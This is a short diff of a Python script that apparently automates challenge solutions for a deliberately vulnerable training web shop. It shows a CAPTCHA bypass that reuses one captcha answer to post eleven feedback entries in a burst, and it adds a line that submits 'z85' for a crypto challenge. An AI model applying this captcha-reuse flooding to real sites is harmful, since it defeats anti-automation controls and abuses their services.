@@ -58,6 +58,8 @@ requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captch
 # ---- CAPTCHA Bypass (Submit 10 or more customer feedbacks within 10 seconds.)
 for i in range(11):
 	requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
+# ---- Weird Crypto (Inform the shop about an algorithm or library it should definitely not use the way it does.)
+requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'z85','rating':3})
 
 # ==== Require to log in (admin account) ===
 with requests.session() as session:
